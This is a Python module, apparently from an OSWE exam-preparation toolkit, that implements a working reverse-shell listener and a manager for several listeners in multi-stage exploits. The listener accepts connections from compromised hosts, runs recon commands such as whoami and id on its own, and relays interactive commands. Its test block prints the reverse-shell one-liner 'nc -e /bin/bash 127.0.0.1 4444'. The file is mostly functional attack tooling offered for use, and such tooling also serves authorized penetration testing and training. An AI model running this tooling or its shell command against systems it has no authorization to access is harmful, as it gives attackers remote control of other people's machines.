"""
OSWE Interactive Reverse Shell Listener Module

Professional interactive listener using select() for multiplexing I/O.
Provides a clean shell experience with minimal professional banner.

Example Usage:
    from modules import InteractiveListener
    
    listener = InteractiveListener(port=4444)
    listener.start()
    # ... trigger reverse shell on target ...
    listener.wait_for_connection(timeout=60)
    listener.interactive_shell()
    listener.stop()
"""

import socket
import select
import sys
import threading
import time
from typing import Optional, List, Callable


class InteractiveListener:
    """
    Professional interactive reverse shell listener.
    
    Uses select() for non-blocking I/O multiplexing between socket and stdin,
    providing a true interactive shell experience similar to netcat.
    
    Attributes:
        port: Port to listen on
        interface: Interface to bind to (default: 0.0.0.0)
        initial_commands: Commands to run automatically on connection
        banner_callback: Optional callback for custom banner formatting
    """
    
    def __init__(
        self,
        port: int,
        interface: str = "0.0.0.0",
        initial_commands: Optional[List[str]] = None,
        banner_callback: Optional[Callable[[str], str]] = None
    ):
        self.port = port
        self.interface = interface
        self.initial_commands = initial_commands or ["whoami", "hostname", "id", "pwd"]
        self.banner_callback = banner_callback
        
        self.socket: Optional[socket.socket] = None
        self.connection: Optional[socket.socket] = None
        self.client_address: Optional[tuple] = None
        self.listening = False
        self.connected = False
        self._listener_thread: Optional[threading.Thread] = None
        self._stop_event = threading.Event()
    
    def start(self, blocking: bool = False) -> bool:
        """
        Start the listener.
        
        Args:
            blocking: If True, block until connection received
            
        Returns:
            True if started successfully
        """
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.socket.bind((self.interface, self.port))
            self.socket.listen(1)
            self.listening = True
            
            print(f"[*] Listener started on {self.interface}:{self.port}")
            
            if blocking:
                self._accept_connection()
            else:
                self._listener_thread = threading.Thread(target=self._accept_connection)
                self._listener_thread.daemon = True
                self._listener_thread.start()
            
            return True
            
        except Exception as e:
            print(f"[-] Failed to start listener: {e}")
            return False
    
    def _accept_connection(self) -> None:
        """Accept incoming connection (runs in separate thread if non-blocking)."""
        try:
            self.socket.settimeout(1.0)  # Allow checking stop_event
            
            while not self._stop_event.is_set():
                try:
                    self.connection, self.client_address = self.socket.accept()
                    self.connected = True
                    print(f"\n[+] Connection established from {self.client_address[0]}:{self.client_address[1]}")
                    self._print_banner()
                    break
                except socket.timeout:
                    continue
                    
        except Exception as e:
            if not self._stop_event.is_set():
                print(f"[-] Error accepting connection: {e}")
    
    def _print_banner(self) -> None:
        """Print professional banner on successful connection."""
        if self.banner_callback:
            banner = self.banner_callback(self.client_address[0])
        else:
            banner = self._default_banner(self.client_address[0])
        
        print(banner)
        
        # Send initial commands
        if self.initial_commands and self.connection:
            cmd_string = "; ".join(self.initial_commands) + "\n"
            try:
                self.connection.sendall(cmd_string.encode())
            except:
                pass
    
    def _default_banner(self, client_ip: str) -> str:
        """Generate minimal professional banner."""
        lines = [
            "=" * 50,
            f"  Shell established from {client_ip}",
            "=" * 50,
            ""
        ]
        return "\n".join(lines)
    
    def wait_for_connection(self, timeout: Optional[int] = None) -> bool:
        """
        Wait for a connection to be established.
        
        Args:
            timeout: Maximum seconds to wait (None = indefinite)
            
        Returns:
            True if connection established, False if timeout
        """
        start_time = time.time()
        
        while not self.connected:
            if self._stop_event.is_set():
                return False
            
            if timeout and (time.time() - start_time) > timeout:
                print(f"[-] Timeout waiting for connection ({timeout}s)")
                return False
            
            time.sleep(0.1)
        
        return True
    
    def interactive_shell(self) -> None:
        """
        Start interactive shell session.
        
        Uses select() for multiplexing between socket and stdin,
        allowing simultaneous input and output.
        """
        if not self.connected or not self.connection:
            print("[-] No active connection")
            return
        
        print("[*] Entering interactive shell (Ctrl+C to exit)\n")
        
        try:
            while self.connected:
                # Use select to multiplex between socket and stdin
                readable, _, _ = select.select(
                    [self.connection, sys.stdin],
                    [],
                    [],
                    0.1
                )
                
                for source in readable:
                    if source is self.connection:
                        # Data from remote host
                        data = self.connection.recv(4096)
                        if not data:
                            print("\n[-] Connection closed by remote host")
                            self.connected = False
                            break
                        sys.stdout.write(data.decode(errors="ignore"))
                        sys.stdout.flush()
                    
                    elif source is sys.stdin:
                        # Data from local user
                        try:
                            cmd = sys.stdin.readline()
                            if self.connection:
                                self.connection.sendall(cmd.encode())
                        except (BrokenPipeError, OSError):
                            print("\n[-] Connection lost")
                            self.connected = False
                            break
        
        except KeyboardInterrupt:
            print("\n[!] Interrupted by user")
        except Exception as e:
            print(f"\n[-] Shell error: {e}")
        finally:
            self.connected = False
    
    def send_command(self, command: str) -> Optional[str]:
        """
        Send a single command and return the output.
        
        Args:
            command: Command to execute
            
        Returns:
            Command output or None if failed
        """
        if not self.connected or not self.connection:
            return None
        
        try:
            # Clear any pending data
            self.connection.setblocking(False)
            try:
                while True:
                    data = self.connection.recv(4096)
                    if not data:
                        break
            except BlockingIOError:
                pass
            self.connection.setblocking(True)
            
            # Send command
            self.connection.sendall(f"{command}\n".encode())
            
            # Wait for and collect output
            time.sleep(0.5)  # Give command time to execute
            output = b""
            
            self.connection.settimeout(2.0)
            try:
                while True:
                    chunk = self.connection.recv(4096)
                    if not chunk:
                        break
                    output += chunk
            except socket.timeout:
                pass
            
            return output.decode(errors="ignore").strip()
            
        except Exception as e:
            print(f"[-] Command failed: {e}")
            return None
    
    def stop(self) -> None:
        """Stop the listener and close connections."""
        self._stop_event.set()
        
        if self.connection:
            try:
                self.connection.close()
            except:
                pass
            self.connection = None
        
        if self.socket:
            try:
                self.socket.close()
            except:
                pass
            self.socket = None
        
        self.listening = False
        self.connected = False
        
        if self._listener_thread and self._listener_thread.is_alive():
            self._listener_thread.join(timeout=2.0)
        
        print("[*] Listener stopped")
    
    def is_connected(self) -> bool:
        """Check if currently have an active connection."""
        return self.connected and self.connection is not None
    
    def get_client_info(self) -> Optional[dict]:
        """
        Get information about connected client.
        
        Returns:
            Dict with 'ip' and 'port' or None if not connected
        """
        if not self.client_address:
            return None
        
        return {
            'ip': self.client_address[0],
            'port': self.client_address[1]
        }


class ListenerManager:
    """
    Manager for multiple listeners (useful for multi-stage exploits).
    
    Example:
        manager = ListenerManager()
        
        # Start multiple listeners
        manager.start_listener("shell1", 4444)
        manager.start_listener("shell2", 4445)
        
        # Wait for all or specific listener
        manager.wait_for_connection("shell1")
        
        # Access individual listener
        shell1 = manager.get_listener("shell1")
        shell1.interactive_shell()
        
        # Stop all
        manager.stop_all()
    """
    
    def __init__(self):
        self.listeners: dict[str, InteractiveListener] = {}
    
    def start_listener(
        self,
        name: str,
        port: int,
        interface: str = "0.0.0.0",
        initial_commands: Optional[List[str]] = None
    ) -> bool:
        """Start a new named listener."""
        if name in self.listeners:
            print(f"[!] Listener '{name}' already exists")
            return False
        
        listener = InteractiveListener(
            port=port,
            interface=interface,
            initial_commands=initial_commands
        )
        
        if listener.start(blocking=False):
            self.listeners[name] = listener
            return True
        
        return False
    
    def get_listener(self, name: str) -> Optional[InteractiveListener]:
        """Get a listener by name."""
        return self.listeners.get(name)
    
    def wait_for_connection(self, name: Optional[str] = None, timeout: Optional[int] = None) -> bool:
        """
        Wait for connection on specific or any listener.
        
        Args:
            name: Specific listener name (None = any listener)
            timeout: Maximum seconds to wait
            
        Returns:
            True if connection established
        """
        start_time = time.time()
        
        while True:
            if timeout and (time.time() - start_time) > timeout:
                return False
            
            if name:
                listener = self.listeners.get(name)
                if listener and listener.is_connected():
                    return True
            else:
                for listener in self.listeners.values():
                    if listener.is_connected():
                        return True
            
            time.sleep(0.1)
    
    def stop_listener(self, name: str) -> bool:
        """Stop a specific listener."""
        if name not in self.listeners:
            return False
        
        self.listeners[name].stop()
        del self.listeners[name]
        return True
    
    def stop_all(self) -> None:
        """Stop all listeners."""
        for listener in self.listeners.values():
            listener.stop()
        self.listeners.clear()
    
    def list_listeners(self) -> dict:
        """Get status of all listeners."""
        return {
            name: {
                'listening': listener.listening,
                'connected': listener.is_connected(),
                'client': listener.get_client_info()
            }
            for name, listener in self.listeners.items()
        }


# Convenience function for quick usage
def create_listener(
    port: int,
    interface: str = "0.0.0.0",
    initial_commands: Optional[List[str]] = None
) -> InteractiveListener:
    """
    Create and start a listener (convenience function).
    
    Args:
        port: Port to listen on
        interface: Interface to bind to
        initial_commands: Commands to run on connection
        
    Returns:
        Configured and started InteractiveListener
    """
    listener = InteractiveListener(
        port=port,
        interface=interface,
        initial_commands=initial_commands
    )
    listener.start(blocking=False)
    return listener


if __name__ == "__main__":
    # Test the listener
    print("[*] Testing InteractiveListener module")
    print("[*] Starting listener on port 4444...")
    print("[*] Use 'nc -e /bin/bash 127.0.0.1 4444' to test")
    
    listener = InteractiveListener(port=4444)
    
    if listener.start(blocking=False):
        print("[*] Waiting for connection (30s timeout)...")
        if listener.wait_for_connection(timeout=30):
            listener.interactive_shell()
        else:
            print("[-] No connection received")
        listener.stop()
    else:
        print("[-] Failed to start listener")
